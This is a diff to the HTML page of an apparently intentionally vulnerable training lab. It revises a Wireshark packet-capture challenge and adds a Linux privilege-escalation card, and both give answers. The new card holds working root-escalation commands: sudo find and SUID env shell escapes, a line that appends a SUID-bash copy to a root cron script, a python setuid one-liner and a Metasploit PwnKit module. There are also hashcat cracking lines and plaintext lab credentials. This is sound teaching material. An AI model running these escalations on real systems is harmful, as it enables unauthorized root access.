@@ -184,17 +184,19 @@ openssl x509 -in server.pem -noout -serial ; openssl x509 -in revoked.pem -noout
 openssl x509 -in server.pem -noout -fingerprint -sha256</code></details>
   <p class="muted">Full console + answers → <a href="/certificates/index.html">Certificates hub</a> · <a href="/certificates/solution.md">solution.md</a></p></div>
 
-<div class="card"><h2>📡 Network capture <span class="flag-pill">offline · wireshark/tshark</span></h2>
-  <p class="muted">One plaintext HTTP capture that leaks <b>three</b> secrets, each a level harder to read.</p>
-  <p class="muted">📥 <b>Download:</b> <a href="/pcap/http_login_cleartext.pcap">http_login_cleartext.pcap</a></p>
-  <details><summary>🟢 Easy — recover the cleartext form login</summary><code class="pl">tshark -r http_login_cleartext.pcap -z follow,tcp,ascii,0 -q</code></details>
-  <details><summary>🟡 Medium — decode the <code>Authorization: Basic</code> header</summary><code class="pl">tshark -r http_login_cleartext.pcap -Y http.request -T fields -e http.authorization
-echo '&lt;base64&gt;' | base64 -d        # Basic = base64(user:pass), not encryption</code></details>
-  <details><summary>🟠 Hard — decode the <code>Set-Cookie</code> session token</summary><code class="pl">tshark -r http_login_cleartext.pcap -Y http.response -T fields -e http.set_cookie
-echo '&lt;base64&gt;' | base64 -d        # unsigned JSON → forgeable</code></details>
-  <details><summary>🔴 Expert — reconstruct the exchange + state the impact</summary><code class="pl">tshark -r http_login_cleartext.pcap -Y http.request -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri</code></details>
-  <p class="muted">Full console + answers → <a href="/pcap/index.html">Network capture hub</a> · <a href="/pcap/solution.md">solution.md</a></p>
-  <p class="muted">📂 3 more case studies (cleartext FTP in noise · DNS exfiltration · SSH brute force) → <a href="/pcap/cases/README.md">cases</a> · <a href="/pcap/cases/solution.md">answers</a></p></div>
+<div class="card"><h2>📡 Network capture <span class="flag-pill">offline · Wireshark</span></h2>
+  <p class="muted">🎯 <b>Goal:</b> recover the hidden credential/flag in each capture using <b>Wireshark</b> — the challenge is choosing the right <b>display filter</b> for the protocol in play.</p>
+  <p class="muted"><b>One capture per level</b>, each a different protocol — the skill is picking the right <b>Wireshark display filter</b>. Open each in Wireshark and type the filter in the top bar.</p>
+  <details open><summary>🟢 Easy — <a href="/pcap/http_login_cleartext.pcap" download>http_login_cleartext.pcap</a> · cleartext HTTP login</summary><code class="pl">Filter:  http
+Right-click the POST ▸ Follow ▸ HTTP Stream   →  username=admin&amp;password=S3ntinel!Admin
+Bonus (same capture):  http.authorization  = Basic base64(user:pass)  ·  http.set_cookie  = unsigned base64 JSON token</code></details>
+  <details><summary>🟡 Medium — <a href="/pcap/cases/case1_busy_lan_ftp.pcap" download>case1_busy_lan_ftp.pcap</a> · find the login in a busy LAN</summary><code class="pl">Filter:  ftp        (~81 frames of DNS / mDNS / NBNS / SSDP / ARP / HTTP noise — filter to the one plaintext protocol)
+Right-click ▸ Follow ▸ TCP Stream  →  USER bmaint / PASS Ftp!Lan2026     (tip: ftp.request.command isolates USER/PASS)</code></details>
+  <details><summary>🟠 Hard — <a href="/pcap/cases/case2_dns_exfil.pcap" download>case2_dns_exfil.pcap</a> · data smuggled out over DNS</summary><code class="pl">Filter:  dns        (~51 DNS frames; most are normal browsing — spot the odd one)
+dns.qry.name contains "evil-exfil"   →  high-entropy subdomain labels; take each left-most label, join, base32-decode → FLAG{...}</code></details>
+  <details><summary>🔴 Expert — <a href="/pcap/cases/case3_ssh_bruteforce.pcap" download>case3_ssh_bruteforce.pcap</a> · brute force on encrypted SSH</summary><code class="pl">Filter:  tcp.port==22 &amp;&amp; tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0    →  15 connection attempts, all from 10.0.0.66
+Statistics ▸ Conversations ▸ TCP  →  14 tiny (reset after the banner) + 1 that transfers data &amp; closes cleanly = the success. Encrypted ≠ invisible.</code></details>
+  <p class="muted">Full Wireshark walkthrough → <a href="/pcap/solution.md">solution.md</a> · <a href="/pcap/index.html">Network hub</a></p></div>
 
 <div class="card"><h2>🔓 TLS decryption <span class="flag-pill">🏁 decrypt HTTPS</span></h2>
   <p class="muted">An encrypted HTTPS capture + the server's recovered <b>RSA private key</b>: add the key, decrypt the session, read the login and flag — then meet a second capture where the key is useless (forward secrecy).</p>
@@ -218,6 +220,18 @@ ffuf -ic -u http://localhost:8000/recon_lab/backup/FUZZ -w /usr/share/wordlists/
 hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt   # SHA-1, unsalted</code></details>
   <details><summary>🔴 Expert — L5 salted vault dump (<code>hash:salt</code>)</summary><code class="pl">hashcat -m 10 vault.txt /usr/share/wordlists/rockyou.txt   # md5(pass+salt)</code></details>
   <p class="muted">The chain: recurse <code>common.txt</code> → decode the <code>.b64</code> login → crack the two hashes. Lab index → <a href="/recon_lab/">/recon_lab/</a></p></div>
+
+<div class="card"><h2>🧗 Privilege Escalation (Linux) <span class="flag-pill">offline · GTFOBins + Metasploit</span></h2>
+  <p class="muted">🎯 <b>Goal:</b> you have a low-priv <code>www-data</code> shell on <code>web01</code> — escalate to <b>root</b> and read <code>/root/flag.txt</code>. Spot <b>all 5</b> privesc vectors in the pre-collected <code>enum/</code> output and write the exact exploit for each. Start → <a href="/privesc/">/privesc/</a></p>
+  <details><summary>🟢 sudo — <code>enum/sudo_l.txt</code></summary><code class="pl">(root) NOPASSWD: /usr/bin/find   →   sudo find . -exec /bin/sh \; -quit</code></details>
+  <details><summary>🟡 SUID — <code>enum/suid.txt</code></summary><code class="pl">/usr/bin/env is SUID-root   →   /usr/bin/env /bin/sh -p</code></details>
+  <details><summary>🟠 cron — <code>enum/cron.txt</code></summary><code class="pl">/opt/scripts/backup.sh world-writable, root runs it every minute:
+echo 'cp /bin/bash /tmp/rb && chmod u+s /tmp/rb' >> /opt/scripts/backup.sh     # wait 1 min → /tmp/rb -p</code></details>
+  <details><summary>🟠 capability — <code>enum/capabilities.txt</code></summary><code class="pl">/usr/bin/python3.9 = cap_setuid+ep   →   /usr/bin/python3.9 -c 'import os;os.setuid(0);os.system("/bin/sh")'</code></details>
+  <details><summary>🔴 pkexec / PwnKit — <code>enum/suid.txt</code> + <code>enum/system.txt</code></summary><code class="pl">pkexec SUID on Ubuntu 21.10   →   CVE-2021-4034 (PwnKit) local root  (public PoC, or the MSF module)</code></details>
+  <details><summary>🧰 Metasploit — Meterpreter session → root</summary><code class="pl">use post/multi/recon/local_exploit_suggester ; set SESSION N ; run
+use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec ; set SESSION N ; set LHOST &lt;you&gt; ; run   # → root</code></details>
+  <p class="muted">Full answers → <a href="/privesc/solution.md">solution.md</a> · reference <a href="https://gtfobins.github.io">GTFOBins</a></p></div>
 
 </div>
 <footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
